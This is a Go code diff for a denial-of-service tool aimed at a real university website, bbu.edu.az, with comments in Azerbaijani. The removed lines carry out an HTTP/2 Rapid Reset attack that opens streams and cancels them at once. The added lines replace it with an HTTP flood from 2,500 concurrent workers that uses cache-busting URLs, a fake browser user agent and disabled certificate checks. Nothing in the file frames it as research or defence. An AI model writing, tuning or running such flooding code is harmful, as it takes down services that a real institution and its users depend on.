@@ -3,16 +3,15 @@ package main
 import (
 	"crypto/tls"
 	"fmt"
+	"math/rand"
 	"net"
+	"net/http"
 	"sync/atomic"
 	"time"
-
-	"golang.org/x/net/http2"
-	"golang.org/x/net/http2/hpack"
 )
 
 var (
-	target  = "bbu.edu.az:443" // Port mütləqdir
+	target  = "bbu.edu.az:443" 
 	sni     = "bbu.edu.az"
 	workers = 2500
 	count   uint64
@@ -20,66 +19,64 @@ var (
 )
 
 func main() {
-	fmt.Printf("[!!!] KATAKLİZM-X-FORCE AKTİVDİR: %s\n", sni)
+	fmt.Printf("[!!!] KATAKLİZM-X-FORCE (NATIVE) START: %s\n", sni)
 	
+	// Standart HTTP/2 Transport yaradırıq
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{
+			InsecureSkipVerify: true,
+			NextProtos:         []string{"h2", "http/1.1"},
+			ServerName:         sni,
+		},
+		MaxIdleConns:        10000,
+		MaxIdleConnsPerHost: 5000,
+		ForceAttemptHTTP2:   true, // HTTP/2-ni daxili olaraq aktiv edir
+	}
+
+	client := &http.Client{
+		Transport: tr,
+		Timeout:   10 * time.Second,
+	}
+
 	for i := 0; i < workers; i++ {
 		go func() {
 			for {
-				attack()
-				// Bağlantını tez-tez yeniləmək sistem resurslarını daha çox yorur
-				time.Sleep(5 * time.Millisecond) 
+				attack(client)
+				// Saniyədə minlərlə sorğu üçün fasiləni minimuma endirdik
+				time.Sleep(1 * time.Millisecond) 
 			}
 		}()
 	}
 
+	// Səssiz Hesabat
 	for {
 		time.Sleep(5 * time.Second)
-		fmt.Printf("[HAKAI] RESET: %d | FAIL: %d\n", atomic.LoadUint64(&count), atomic.LoadUint64(&errors))
+		fmt.Printf("[HAKAI] REQ_SENT: %d | FAIL: %d\n", atomic.LoadUint64(&count), atomic.LoadUint64(&errors))
 	}
 }
 
-func attack() {
-	cfg := &tls.Config{
-		InsecureSkipVerify: true,
-		NextProtos:         []string{"h2"},
-		ServerName:         sni,
-	}
-
-	dialer := net.Dialer{Timeout: 5 * time.Second}
-	conn, err := dialer.Dial("tcp", target)
+func attack(c *http.Client) {
+	// Cache bypass üçün dinamik URL
+	u := fmt.Sprintf("https://%s/?cache_bypass=%d&ts=%d", target, rand.Intn(999999), time.Now().UnixNano())
+	
+	req, err := http.NewRequest("GET", u, nil)
 	if err != nil {
 		atomic.AddUint64(&errors, 1)
 		return
 	}
-	defer conn.Close()
 
-	tlsConn := tls.Client(conn, cfg)
-	if err := tlsConn.Handshake(); err != nil {
+	// Real brauzer başlığı
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+	req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
+	
+	// Sorğunu göndər
+	resp, err := c.Do(req)
+	if err != nil {
 		atomic.AddUint64(&errors, 1)
 		return
 	}
-	defer tlsConn.Close()
-
-	tlsConn.Write([]byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"))
-
-	framer := http2.NewFramer(tlsConn, tlsConn)
-	// Serverin emal limitlərini aşmaq üçün yüksək stream dəyəri
-	framer.WriteSettings(http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 10000})
-
-	for i := 0; i < 500; i++ {
-		streamID := uint32(2*i + 1)
-		
-		framer.WriteHeaders(http2.HeadersFrameParam{
-			StreamID:   streamID,
-			EndHeaders: true,
-			EndStream:  false,
-			BlockFragment: []byte{
-				0x82, 0x86, 0x84, 0x41, 0x8c, 0xf1, 0xe3, 0xc2, 0xe5, 0xf2, 0x3a, 0x6b, 0xa0, 0xab, 0x90, 0xf4, 0xff,
-			},
-		})
-
-		// RST_STREAM: Rapid Reset-in əsas nöqtəsi
-		framer.WriteRSTStream(streamID, http2.ErrCodeCancel)
-		atomic.AddUint64(&count, 1)
-	}
+	
+	// Body-ni dərhal bağla ki, socket-lər dolsun amma boşalmasın
+	resp.Body.Close()
+	atomic.AddUint64(&count, 1)
 }
